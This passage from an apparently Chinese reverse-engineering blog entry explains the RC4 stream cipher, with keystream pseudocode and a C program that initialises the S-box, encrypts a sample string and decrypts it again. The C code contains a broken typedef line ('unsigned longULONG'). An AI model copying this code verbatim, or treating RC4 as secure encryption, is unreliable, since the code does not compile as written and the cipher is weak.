c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++">i=<span class="hljs-number">0</span>;<br><br>j=<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">while</span>(datalength--)&#123;<span class="hljs-comment">//相当于执行1024次，这样生成的秘钥流也是1024个字节</span><br>i = (i + <span class="hljs-number">1</span>) mod <span class="hljs-number">256</span>;<br>  j = (j + S[i]) mod <span class="hljs-number">256</span>;<br>  <span class="hljs-built_in">swap</span>(S[i] , S[j]);<br>  t = (S[i] + S[j]) mod <span class="hljs-number">256</span>;<br>  k = S[t];<span class="hljs-comment">//这里的K就是当前生成的一个秘钥流中的一位</span><br>    <span class="hljs-comment">//可以直接在这里进行加密，当然也可以将密钥流保存在数组中，最后进行异或就ok</span><br>    <span class="hljs-comment">//data[]=data[]^k； 进行加密，&quot;^&quot;是异或运算符</span><br><br>&#125;<br></code></pre></td></tr></table></figure><p>解密过程：把密文异或</p><p>c语言实现代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> longULONG;<br><br><span class="hljs-comment">/* 初始化算法（KSA）函数</span><br><span class="hljs-comment"> *参数 1: 一个 256 长度的 char 型数组，定义为: unsigned char sBox[256];</span><br><span class="hljs-comment"> *参数 2: 密钥，其内容可以随便定义：char key[256];</span><br><span class="hljs-comment"> *参数 3: 密钥的长度，Len = strlen(key);</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">rc4_init</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* key, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span><br>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> k[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)<br>    &#123;<br>        s[i] = i;<br>        k[i] = key[i%Len];<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)<br>    &#123;<br>        j = (j + s[i] + k[i]) % <span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j]; <span class="hljs-comment">// 交换 s[i] 和 s[j]</span><br>        s[j] = tmp;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/* 伪随机子密码生成算法（PRGA）函数完成加、解密。</span><br><span class="hljs-comment"> * 过程中，密钥的主要功能是将 S 搅乱，i 确保 S 的每个元素都得到处理，j 保证 S 的搅乱是随机的。</span><br><span class="hljs-comment"> * 由此，不同的 S 在经过 PRGA 处理后可以得到不同的子密钥序列，将 S 和明文进行 xor 运算，得到密文，解密过程也完全相同。</span><br><span class="hljs-comment"> * 参数 1：是上边 rc4_init 函数中，被搅乱的 S;</span><br><span class="hljs-comment"> * 参数 2：是需要加密的 Data 数据;</span><br><span class="hljs-comment"> * 参数 3：是 Data 的长度。</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">rc4_crypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* s, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* Data, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> Len)</span><br>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>, t = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> k = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> tmp;<br>    <span class="hljs-keyword">for</span> (k = <span class="hljs-number">0</span>; k &lt; Len; k++)<br>    &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + s[i]) % <span class="hljs-number">256</span>;<br>        tmp = s[i];<br>        s[i] = s[j]; <span class="hljs-comment">// 交换 s[x] 和 s[y]</span><br>        s[j] = tmp;<br>        t = (s[i] + s[j]) % <span class="hljs-number">256</span>;<br>        Data[k] ^= s[t];<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> s[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;, s2[<span class="hljs-number">256</span>] = &#123; <span class="hljs-number">0</span> &#125;;   <span class="hljs-comment">// S</span><br>    <span class="hljs-type">char</span> key[<span class="hljs-number">256</span>] = &#123; <span class="hljs-string">&quot;justfortest&quot;</span> &#125;;<br>    <span class="hljs-type">char</span> pData[<span class="hljs-number">512</span>] = <span class="hljs-string">&quot;这是一个用来加密的数据 Data&quot;</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len = <span class="hljs-built_in">strlen</span>(pData);<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pData=%s\n&quot;</span>, pData);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;key=%s, length=%zu\n\n&quot;</span>, key, <span class="hljs-built_in">strlen</span>(key));<br>rc4_init(s, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)key, <span class="hljs-built_in">strlen</span>(key));   <span class="hljs-comment">// 已经完成了初始化</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;完成对 S[i] 的初始化，如下：\n\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02X&quot;</span>, s[i]);<br>        <span class="hljs-keyword">if</span> (i &amp;&amp; (i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span> == <span class="hljs-number">0</span>)<span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">256</span>; i++)               <span class="hljs-comment">// 用 s2[i] 暂时保留经过初始化的 s[i]，很重要！</span><br>    &#123;<br>        s2[i] = s[i];<br>    &#125;<br> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;已经初始化，现在加密: \n\n&quot;</span>);<br>    rc4_crypt(s, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)pData, len);        <span class="hljs-comment">// 加密</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pData=%s\n\n&quot;</span>, pData);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;已经加密，现在解密: \n\n&quot;</span>);<br>    rc4_crypt(s2, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)pData, len);       <span class="hljs-comment">// 解密</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;pData=%s\n\n&quot;</span>, pData);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
